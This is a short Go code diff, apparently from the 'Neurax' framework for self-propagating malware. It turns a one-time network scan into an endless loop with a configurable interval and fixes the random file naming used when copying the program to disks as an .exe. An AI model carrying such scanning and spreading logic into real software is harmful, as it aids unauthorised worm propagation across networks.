@@ -39,6 +39,7 @@ type __NeuraxConfig struct {
 	required_port  int
 	verbose        bool
 	remove         bool
+	scan_interval  string
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -59,6 +60,7 @@ var NeuraxConfig = __NeuraxConfig{
 	base64:         false,
 	verbose:        false,
 	remove:         false,
+	scan_interval:  "2m",
 }
 
 func ReportError(message string, e error) {
@@ -191,7 +193,7 @@ func NeuraxSignal(host string, port int) {
 
 }
 
-func NeuraxScan(c chan string) {
+func neurax_scan_core(c chan string) {
 	if NeuraxConfig.scan_passive {
 		var snapshot_len int32 = 1024
 		var timeout time.Duration = 500000 * time.Second
@@ -240,9 +242,16 @@ func NeuraxScan(c chan string) {
 	}
 }
 
+func NeuraxScan(c chan string) {
+	for {
+		neurax_scan_core(c)
+		time.Sleep(time.Duration(coldfire.IntervalToSeconds(NeuraxConfig.scan_interval)))
+	}
+}
+
 func NeuraxDisks() error {
 	haikunator := haikunator.New(time.Now().UTC().UnixNano())
-	selected_name := haikunator.HaikuNate()
+	selected_name := haikunator.Haikunate()
 	if runtime.GOOS == "windows" {
 		selected_name += ".exe"
 	}
